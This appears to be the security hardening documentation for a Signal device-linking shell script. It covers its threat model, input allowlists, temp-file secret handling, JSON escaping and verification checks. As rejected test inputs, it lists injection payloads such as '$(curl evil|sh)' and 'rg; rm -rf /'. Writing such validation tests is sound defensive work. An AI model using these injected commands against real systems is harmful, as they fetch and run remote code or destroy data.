# signal-setup — Security Hardening Reference

Security documentation for the `signal-setup` skill
(`scripts/signal-setup.sh`). It describes the hardening that is **built into**
the script, the threat model it defends against, the trust anchors it relies
on, and the operational invariants an operator must uphold.

Read this together with the **Security model** section of
[`SKILL.md`](./SKILL.md). This file is the detailed, authoritative reference;
`SKILL.md` carries the short summary.

---

## 1. Why this script needs a hardened posture

Unlike a typical web feature, `signal-setup` has **no login/session surface**.
Its risk comes from three properties of what it actually does:

1. **It mints Signal device-link secrets.** The `sgnl://` provisioning URI it
   captures is a short-lived credential: anyone who reads it within the
   ~60-second window can link *their* device to the account.
2. **It runs payloads on remote Azure VMs as root.** Remote minting goes through
   `az vm run-command invoke ... RunShellScript`, which executes the supplied
   script **as root** on the target VM. Operator-supplied values (`--host`,
   `--resource-group`, temp-file paths) are interpolated into that payload.
3. **It speaks to a local unauthenticated daemon.** The JSON-RPC daemon on
   `127.0.0.1:7583` performs no authentication; any local process that can reach
   the socket can drive it.

The threat surface is therefore **secret handling, privilege use, and
injection** — not authentication or web auth.

---

## 2. Threat model

| # | Threat | Vector | Severity | Mitigation (this script) |
|---|--------|--------|----------|--------------------------|
| T1 | Command / argument injection | Malicious `--host`, `--resource-group`, `--group`, `--phone` flowing into shell command lines, the root-executed `az run-command` payload, or JSON-RPC strings | **High** | Strict allowlist validation (fail closed) — §3 |
| T2 | Link-secret disclosure via predictable `/tmp` | Another local user reads or pre-creates `/tmp/slink-*` / `/tmp/scli-*` | **Medium** | 128-bit CSPRNG per-run path, `0600` via `systemd-run --property=UMask=0077`, unlink-after-render — §4 |
| T3 | Root `rm -f` on an attacker-planted symlink | Cleanup deletes/overwrites a file a symlink points at | **Medium** | Unguessable per-run paths so the target name can't be pre-created — §4 |
| T4 | JSON / argument injection into the daemon | `--phone` / `--group` / `groupId` embedded raw into a JSON-RPC request | **Medium** | `json_escape()` on every interpolated value — §5 |
| T5 | Unauthenticated daemon reachable off-box | Daemon bound to `0.0.0.0` | **Low** | Bound to `127.0.0.1` only; never `0.0.0.0` — §6. `SIGNAL_SETUP_DAEMON_TCP` is loopback-allowlist validated (fail-closed) |
| T6 | PII / secret leakage via `ps`, argv, or verbose logs | Phone number in argv; `-vv` trace captures identity material; link secret on a render command line | **Low** | `0600` logs, link secret always purged, trace purged on success (retained `0600` on failure for debugging), documented argv caveat, **link secret piped to `qrencode` via stdin (never argv)** — §7 |

---

## 3. Input validation (mitigates T1)

All operator-controlled string inputs are validated **immediately after
argument parsing and before any use**, via a `validate <label> <value> <regex>`
helper that calls `die` (non-zero exit) on any violation. Validation is
**fail-closed**: an empty or non-matching value aborts the run before a single
downstream command, `az` payload, or JSON-RPC request is built.

| Input | Allowlist regex | Rationale |
|-------|-----------------|-----------|
| `--host` | `^[A-Za-z0-9._-]+$` | DNS-label + Azure VM-name charset. No spaces, `;`, `$`, `` ` ``, quotes, or slashes — this value is interpolated into the root-executed remote payload and into `systemd` unit names. |
| `--resource-group` | `^[A-Za-z0-9._()-]+$` | Azure resource-group naming charset (allows `()`). Flows into `az vm run-command -g`. |
| `--group` | `^[A-Za-z0-9._ -]+$` | Self-group display name. Printable, spaces allowed, but no shell/JSON metacharacters. |
| `--phone` | `^\+[1-9][0-9]{7,14}$` | Strict E.164. Validated only when provided. Flows into `signal-cli -a`, daemon args, and JSON-RPC. |
| `SIGNAL_SETUP_DAEMON_TCP` | loopback host + `^[1-9][0-9]{0,4}$` port (≤65535) | Loopback-only allowlist; the port flows into `daemon --tcp`, `/dev/tcp` probes, and `nc`. See §6. |
| `SIGNAL_SETUP_DAEMON_WAIT_ATTEMPTS` | `^[1-9][0-9]{0,3}$` | Positive integer only. Interpolated unquoted into the root-executed remote payload (`seq 1 …`); numeric allowlist closes the self-injection path. |
| `SIGNAL_SETUP_RPC_TIMEOUT_SECONDS` | `^[1-9][0-9]{0,3}$` | Positive integer only. Interpolated unquoted into the root-executed remote payload (`timeout … nc`); numeric allowlist closes the self-injection path. |

Examples that are **rejected** (fail closed, non-zero exit, no side effects):

```text
--host 'x;reboot'                 → invalid characters
--host '$(curl evil|sh)'          → invalid characters
--resource-group 'rg; rm -rf /'   → invalid characters
--group 'a","evil":"'             → invalid characters (JSON break-out)
--phone '+1 555 000; id'          → not E.164
--phone '15551234567'             → missing leading '+'
```

Examples that are **accepted**:

```text
--host local          --host deva          --host ia3.internal
--resource-group rysweet-linux-vm-pool
--resource-group my_rg(prod)
--group amplihack     --group "amplihack fleet"
--phone +15551234567
```

**Invariant:** never widen these regexes to admit whitespace-splitting,
shell metacharacters (`; | & $ \` ( ) < > * ? { } [ ]`), quotes, or
newlines. The `--host` and `--resource-group` values in particular are placed
into a script executed as **root** on the remote VM.

---

## 4. Secret temp-file handling (mitigates T2, T3)

The minted `sgnl://` URI and the `signal-cli -vv` trace log are treated as
secrets and written under a hardened regime:

- **Owner-only from birth (`0600`).** Two layers guarantee mode `rw-------`:
  - **`umask 077`** is set before any file the *script process itself* writes
    (e.g. the daemon log), so those are owner-only from birth.
  - **The link secrets are written inside a `systemd-run` transient unit.** The
    `URI_FILE` and `LOG_FILE` are created by a shell redirect *inside* the
    transient unit, **not** by the script process — and a `systemd-run` unit
    does **not** inherit the caller's `umask` (systemd defaults to
    `UMask=0022`, which would yield world-readable `0644`). We therefore pin the
    unit's umask explicitly with **`--property=UMask=0077`** on **both** the
    local and remote `systemd-run` invocations, so the secret files are `0600`
    from creation. This is the mechanism that actually protects the secrets;
    the process-level `umask 077` alone cannot reach files written inside the
    unit.
- **Unguessable, per-run paths.** File names embed a per-invocation
  `RUN_TOKEN`. It is drawn from `/dev/urandom` as 32 hex characters (**128 bits**
  of entropy), falling back to an `<epoch>-<pid>-<RANDOM><RANDOM><RANDOM>`
  composite only if `/dev/urandom` is unreadable:

  ```text
  RUN_TOKEN = "<32 hex chars from /dev/urandom>"   # fallback: "<epoch>-<pid>-<RANDOM>..."
  URI_FILE  = /tmp/slink-<host>-<RUN_TOKEN>.out
  LOG_FILE  = /tmp/scli-<host>-<RUN_TOKEN>.log
  ```

  Because the suffix cannot be predicted (128-bit CSPRNG space), another local
  user cannot **pre-create** the path as a symlink (defeating the classic
  `/tmp` symlink attack, T3) nor **poll** a known path to read the secret (T2).
- **Trap-based cleanup.** A `trap cleanup_secrets EXIT INT TERM` guarantees the
  URI file is removed on any exit path — normal completion, `Ctrl-C`, or
  termination. The `sgnl://` link secret (`URI_FILE`) is **always** purged. The
  `-vv` trace log and the local daemon-launch log — which hold identity material
  but **not** the link secret — are purged on **success** and deliberately
  **retained (still `0600`) on failure**, with their paths printed, so a
  hard-to-reproduce link failure inside the ~60s window stays debuggable. The
  local daemon itself runs under a transient `systemd-run` unit, so its own
  runtime output is journald-captured under `$DAEMON_UNIT` (the failure path
  prints the `journalctl -u` command); `DAEMON_LOG` holds only the launcher
  message. For
  remote hosts, cleanup also removes the URI (always) and the trace (on success)
  on the VM via `run-command`.
- **Unlink-after-render.** The URI copy is deleted **immediately after the QR is
  rendered**, not left on disk for the full ~60-second window. The secret lives
  on disk only for the few milliseconds between capture and QR emission.

**Invariant:** do not reintroduce fixed paths such as `/tmp/slink-<host>.out`,
`/tmp/scli-<host>.log`, or `/tmp/signal-daemon-<host>.log`. Predictable names
re-open T2/T3. Every secret- or message-bearing path must carry the per-run
token.

---

## 5. JSON-RPC escaping (mitigates T4)

Every operator- or daemon-derived value embedded into a JSON-RPC request string
is passed through `json_escape()` first. `json_escape` escapes backslash
(first), double-quote, newline, carriage-return, and tab:

```text
raw:     amplihack","evil":"
escaped: amplihack\",\"evil\":\"
```

This is applied to the account (`--phone`), the group name (`--group`), and the
server-returned `groupId` before they are interpolated into `updateGroup` and
`send` request bodies built by `rpc()`. Escaping runs **in addition to** the
input-validation allowlist (§3): validation blocks the metacharacters at the
door, `json_escape` is defense-in-depth for any value that legitimately
contains a quotable character and for daemon-returned strings that are not
operator-validated.

**Invariant:** any new value interpolated into a JSON-RPC body must go through
`json_escape()`. Never `printf` a raw variable into a JSON string.

---

## 6. Trust anchors & daemon exposure (mitigates T5)

- **Remote trust anchor.** For remote hosts the operator's **`az` login
  identity** plus **passwordless `sudo`/root** on the VM (via `run-command`) are
  the trust anchor. There is no additional secret; possession of the `az`
  session is authority to link. The linked account is deliberately dropped from
  root to the unprivileged account with `--uid=azureuser --gid=azureuser` and
  `--setenv=HOME=/home/azureuser`, so credentials land in the `azureuser` home,
  not root's.
- **Daemon binding.** The JSON-RPC daemon is started with
  `--tcp 127.0.0.1:7583` — **loopback only**. It is intentionally
  **unauthenticated**, so its only boundary is the network binding.
- **Enforced, not just conventional.** The endpoint is configurable via
  `SIGNAL_SETUP_DAEMON_TCP`, but the script validates it at startup and **fails
  closed** on anything but a loopback host (`127.0.0.1`/`localhost`) plus a
  numeric port. Routable hosts (`0.0.0.0`, LAN IPs) and IPv6/multi-colon forms
  are rejected before any daemon is spawned, so this invariant is guaranteed by
  code, not merely documented.

**Invariant:** never bind the daemon to `0.0.0.0`, a routable interface, or a
wildcard. An off-box, unauthenticated JSON-RPC daemon is a full account-control
exposure. This is enforced by loopback-allowlist validation of
`SIGNAL_SETUP_DAEMON_TCP` (fail-closed).

---

## 7. PII & log hygiene (mitigates T6)

- The **phone number** is present in `argv` and the process environment. On a
  shared host, `argv` is visible to other local users via `ps`. This is an
  accepted, documented limitation — use `SIGNAL_PHONE` env (still visible via
  `/proc/<pid>/environ` to the same user only) if you prefer to keep it out of
  shell history, but understand it is not a strong secret boundary on a
  multi-user box.
- The **`sgnl://` link secret is never placed on any command line.** It is
  rendered by piping the URI to `qrencode` **via stdin** (`printf '%s' "$uri" |
  qrencode ...`), not by passing it as an argv argument. Passing it as an
  argument would expose the crown-jewel provisioning secret in `qrencode`'s
  argv (readable by other local users via `ps` / `/proc/<pid>/cmdline`) for the
  duration of the render — defeating the on-disk hardening of §4. Keeping the
  secret off argv is a load-bearing invariant: never `qrencode ... "$uri"`.
- The **`-vv` trace log** can capture identity material (`Associated with:
  +<phone>`, provisioning details). It is written `0600` (the `systemd-run`
  unit's `UMask=0077`, §4) under the per-run token and purged by the cleanup
  trap **on success**. On **failure** it is deliberately retained (still `0600`)
  and its path is printed, so a link failure remains diagnosable; it never
  contains the `sgnl://` link secret (that is `URI_FILE`, always purged).

---

## 8. Operational security invariants (azlin / remote)

These interact with security correctness, not just reliability:

- **Never pipe `azlin`/`az` output into an early-closing consumer.** `azlin` is
  a Rust binary that **aborts (SIGABRT / core-dump) on SIGPIPE**. A core dump
  can persist secret-bearing memory to disk. The script **captures full output
  first**, then filters (`remote_run` reads the whole message before any
  `sed`/`grep`). Do not "optimize" this into `azlin ... | grep -q`.
- **One bastion/azlin session per VM.** Concurrent sessions to the same VM
  core-dump. Do not run this skill against the same host from two places at
  once — besides breaking the run, a crash mid-link can leave a partial secret
  on the VM before the cleanup trap fires.

---

## 9. Verifying the hardening

Quick, non-destructive checks an operator/reviewer can run:

```bash
S=amplifier-bundle/skills/signal-setup/scripts/signal-setup.sh

# Injection attempts must fail closed (non-zero, no side effects):
bash "$S" --host 'x;reboot' --phone +15551234567 ; echo "exit=$?"   # expect non-zero
bash "$S" --host local --group 'a","evil":"' -y   ; echo "exit=$?"   # expect non-zero
bash "$S" --host local --phone '15551234567' -y   ; echo "exit=$?"   # expect non-zero (no '+')

# Valid input parses past validation:
bash "$S" --help ; echo "exit=$?"                                    # expect 0

# Static confirmations:
grep -n 'umask 077'          "$S"   # present, before any file the script writes
grep -n 'RUN_TOKEN'          "$S"   # per-run unguessable suffix
grep -n 'property=UMask=0077' "$S"   # 0600 for unit-written secrets (both systemd-run calls)
grep -n 'trap cleanup_secrets' "$S" # EXIT INT TERM cleanup
grep -n 'json_escape'        "$S"   # applied to phone/group/groupId
grep -n '127.0.0.1:7583'     "$S"   # daemon loopback-only, never 0.0.0.0
```

> **Note on verifying file mode:** `grep 'umask 077'` alone does **not** prove
> the link secrets are `0600` — those files are written *inside* the
> `systemd-run` unit, which ignores the caller's umask. The load-bearing check
> is that **`--property=UMask=0077` appears on every *secret-writing* (`link -n`)
> `systemd-run` invocation** (the daemon unit writes no `sgnl://` secret to disk).
> Assert this by intent rather than a raw count (a bare `grep -c` also matches
> explanatory comments and rots as the script evolves):
>
> ```bash
> # Every unit that writes a link secret (`link -n … > $URI_FILE`) must carry
> # the UMask hardening. Assert by intent, not a hard-coded total:
> link_units=$(grep -c 'link -n' "$S")             # the two mint invocations
> hardened=$(grep -c 'property=UMask=0077' "$S")   # hardening directives present
> [ "$hardened" -ge "$link_units" ] && echo "OK: every link/mint unit is hardened"
> ```
>
> If you have a linked host available, you can also confirm at runtime with
> `stat -c '%a' /tmp/slink-*-<token>.out` during the ~60s window (expect `600`).

---

## 10. Summary of security invariants (do not regress)

1. Validate `--host` / `--resource-group` / `--group` / `--phone` against the
   allowlists **before** any use; fail closed.
2. Every secret-bearing temp path carries the per-run `RUN_TOKEN`; the link
   secrets are `0600` via `systemd-run --property=UMask=0077` (the unit ignores
   the caller's `umask`), with trap cleanup and unlink-the-URI-after-render.
3. `json_escape()` every value interpolated into a JSON-RPC body.
4. Daemon binds `127.0.0.1` only — never `0.0.0.0`.
5. Remote payloads drop root to `--uid/--gid=azureuser`.
6. Never pipe `azlin`/`az` into an early-closing reader; one session per VM.
